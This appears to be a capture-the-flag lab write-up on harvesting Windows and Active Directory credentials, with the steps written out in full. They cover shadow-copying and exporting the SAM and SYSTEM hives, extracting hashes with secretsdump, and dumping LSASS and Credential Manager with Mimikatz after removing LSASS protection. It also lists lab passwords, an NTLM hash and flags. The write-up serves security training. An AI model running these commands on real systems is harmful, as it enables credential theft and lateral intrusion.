<img width="1630" height="345" alt="image" src="https://github.com/user-attachments/assets/5b1282ad-25e5-4dbb-8af0-a4bff6263d21" />

<br>

# Task 1

This room focused on credential harvesting techniques in Windows and Active Directory environments. I practiced extracting credentials from local systems, LSASS memory, Active Directory databases, Kerberos tickets, and Windows credential storage.

# Task 2 

## Lab Setup

Connected to the target machine through RDP using the provided credentials:

* Machine IP: `10.48.141.196`
* Username: `thm`
* Password: `Passw0rd!`

```bash
xfreerdp /u:thm /p:'Passw0rd!' /v:10.48.141.196
```
<img width="1032" height="802" alt="image" src="https://github.com/user-attachments/assets/98c5fef1-f8a2-4326-a5be-93498673bb41" />

<br>

## Task 3 - Credential Harvesting

### Registry Enumeration

Opened Command Prompt on the target Windows machine and used the `reg query` command to recursively search the Windows Registry for entries containing the keyword `flag`.

```cmd id="h7m4sz"
reg query HKLM /f flag /t REG_SZ /s
```

<img width="368" height="48" alt="image" src="https://github.com/user-attachments/assets/a68e1bee-954a-4e3f-999c-c6cbc7bfdb20" />

<br>

**Flag Found:** 7thy4ckm3

---

## Active Directory Enumeration

Used PowerShell to enumerate Active Directory user descriptions and identify exposed credentials stored by administrators.

```powershell id="n2v8qx"
Get-ADUser -Filter * -Properties Description | Select Name,Description
```

<img width="710" height="297" alt="image" src="https://github.com/user-attachments/assets/21ad88a5-62a5-4341-b7d4-ed1c82401668" />

<br>

**Password Found:** Passw0rd!@#

## Task 4 - Local Windows Credentials

### Accessing the SAM Database

Attempted to directly read and copy the SAM database file from the Windows system. However, access was denied because the file was actively being used by the operating system.

```cmd id="b4x1rc"
type C:\Windows\System32\config\sam
```

```cmd id="v8q7mn"
copy C:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
```

---

### Creating a Shadow Copy

Used the Windows Volume Shadow Copy Service (VSS) to create a shadow copy of the C: drive in order to safely access locked system files.

```cmd id="q0n7dp"
wmic shadowcopy call create Volume='C:\'
```

Verified the created shadow volume:

```cmd id="c7z4ek"
vssadmin list shadows
```

---

### Copying SAM & SYSTEM Files

Copied both the `SAM` and `SYSTEM` files from the shadow copy volume to the desktop.

```cmd id="w2p8fa"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\Administrator\Desktop\sam
```

```cmd id="f5v1ja"
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\Administrator\Desktop\system
```

## Registry Hive Extraction

Another method to dump credentials from the SAM database is by exporting registry hive files directly from the Windows Registry.

On the Windows VM, used the `reg save` command with Administrator privileges to export both the `SAM` and `SYSTEM` registry hives.

```cmd id="x4m8pl"
reg save HKLM\sam C:\Users\Administrator\Desktop\sam-reg
```

```cmd id="k7v2qa"
reg save HKLM\system C:\Users\Administrator\Desktop\system-reg
```

Successfully created the registry hive dump files:

* `sam-reg`
* `system-reg`

---

### Extracting NTLM Hashes

Transferred the dumped files to the AttackBox and used Impacket `secretsdump` to extract NTLM hashes from the SAM database.

```bash id="t1m9zy"
impacket-secretsdump -sam sam-reg -system system-reg LOCAL
```

The answer for the question is already shown in the instructions.

**Administrator NTLM Hash:** `98d3a787a80d08385cea7fb4aa2a4261`


## Task 5 - LSASS Credential Dumping

### Accessing LSASS Memory

Local Security Authority Subsystem Service (LSASS) stores authentication material in memory, including NTLM hashes and cached credentials.

On the Windows VM, launched Mimikatz with Administrator privileges.

```cmd id="f9k2qp"
C:\Tools\Mimikatz\mimikatz.exe
```

Enabled debug privileges to allow access to LSASS memory.

```text id="r8x1mv"
privilege::debug
```

---

### Dumping Cached Credentials

Used Mimikatz to extract cached credentials and NTLM hashes stored in the `lsass.exe` process memory.

```text id="d5v7la"
sekurlsa::logonpasswords
```

Successfully retrieved authentication data including NTLM hashes for logged-in users.

---

## Protected LSASS

The target system had LSASS protection enabled, preventing direct credential dumping.

Loaded the `mimidrv` driver using Mimikatz to bypass LSASS protection.

```text id="q2m8zy"
!+
```

Removed LSASS process protection:

```text id="y4n6tx"
!processprotect /process:lsass.exe /remove
```

After disabling protection, the `sekurlsa::logonpasswords` command successfully dumped credentials from memory.

## Task Answers

**Is the LSA protection enabled?**

> Yes

**Successfully removed LSASS protection and dumped credentials using Mimikatz.**

## Windows Credential Manager

### Enumerating Stored Credentials

Windows Credential Manager stores authentication data for applications, websites, and network resources.

On the Windows VM, used `VaultCmd` to enumerate stored credentials from the Web Credentials vault.

```cmd
VaultCmd /listproperties:"Web Credentials"
```
Then we list credentials using

```cmd
VaultCmd /listcreds:"Web Credentials"
```

<img width="960" height="476" alt="image" src="https://github.com/user-attachments/assets/daa6ffae-935c-470f-becb-a0c6197d506c" />

<br>

Successfully identified stored credentials for the internal application.

**Password Found:** `E4syPassw0rd`

---

### Dumping Credential Manager with Mimikatz

To extract credentials stored in Windows Credential Manager, I used Mimikatz on the Windows VM.

```cmd
cd C:\Tools\Mimikatz\
```

Then launched Mimikatz:

```cmd
mimikatz.exe
```

Enabled debug privileges:

```text
privilege::debug
```

Loaded the Mimikatz driver:

```text
!+
```

```text
sekurlsa::credman
```
<img width="977" height="373" alt="image" src="https://github.com/user-attachments/assets/3797bbb4-f9a5-41a6-8098-bf17f1e223ec" />

<br>

At first, `sekurlsa::credman` failed because LSASS protection prevented access to memory. The `0x00000005` error indicates **Access Denied**, meaning LSASS memory protection was enabled and prevented Mimikatz from accessing credential data directly.

Removed LSASS protection:

```text
!processprotect /process:lsass.exe /remove
```

```text
sekurlsa::credman
```
After removing the protection, I was able to dump Credential Manager credentials:

<img width="976" height="467" alt="image" src="https://github.com/user-attachments/assets/bfbf2987-0636-4b98-991b-9f994d3381fa" />

Successfully extracted the stored SMB share password for `10.10.237.226`.

**SMB Share Password:** `jfxRruLkkxoPjwe3`

---

### Using RunAs with Saved Credentials

Enumerated stored Windows credentials using the `cmdkey` command.

```cmd
cmdkey /list
```

Used the `runas` command with the `/savecred` option to launch a new command prompt session as the `thm-local` user.

```cmd
runas /savecred /user:THM.red\thm-local cmd.exe
```

Accessed the saved flag file from the new session.

```cmd
type C:\Users\thm-local\Saved Games\flag.txt
```

<img width="1025" height="690" alt="image" src="https://github.com/user-attachments/assets/d3d4f3be-7598-4e9b-b8be-259a224ed288" />

**Flag:** `THM{RunAS54veCr3ds}`








